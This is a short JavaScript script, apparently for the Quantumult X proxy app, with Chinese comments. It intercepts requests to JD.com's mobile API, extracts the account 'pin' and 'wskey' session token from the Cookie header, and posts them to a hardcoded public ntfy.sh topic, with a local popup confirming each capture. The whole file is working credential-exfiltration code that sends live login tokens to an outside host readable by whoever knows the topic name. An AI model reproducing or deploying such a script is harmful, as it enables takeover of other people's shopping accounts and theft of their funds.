/**************************
 * 京东 wskey 抓取 (Quantumult X)
 * 抓 api.m.jd.com 请求里的 pin + wskey，推到 ntfy
 **************************/

const NTFY_URL = "https://ntfy.sh/HzjHy2codes";

try {
  const cookie = $request.headers["Cookie"] || $request.headers["cookie"] || "";
  const pinM = cookie.match(/pin=([^;]+)/);
  const wskeyM = cookie.match(/wskey=([^;]+)/);

  if (wskeyM && wskeyM[1]) {
    const wskey = wskeyM[1];
    const pin = pinM ? pinM[1] : "unknown";
    const payload = `JDWSKEY pin=${pin};wskey=${wskey};`;

    // 推到 ntfy（去重：同一个 pin+wskey 只推一次）
    const key = `qxjd_${pin}_${wskey.substring(0, 16)}`;
    if (typeof $persistentStore !== "undefined") {
      const last = $persistentStore.read(key);
      if (last) {
        $done({});
      } else {
        $persistentStore.write("1", key);
        push(wskey, pin, payload);
      }
    } else {
      push(wskey, pin, payload);
    }
  }
} catch (e) {
  $notification.post("JD抓取异常", "", String(e));
}

function push(wskey, pin, payload) {
  $httpClient.post(
    {
      url: NTFY_URL,
      headers: { "Content-Type": "text/plain", Title: "JD_wskey_" + pin },
      body: payload,
    },
    (err, resp, data) => {
      $notification.post(
        "✅ JD wskey 已抓取",
        "pin=" + pin,
        "wskey=" + wskey.substring(0, 30) + "..." + (err ? "  推送err:" + err : " 已推送")
      );
    }
  );
}

$done({});
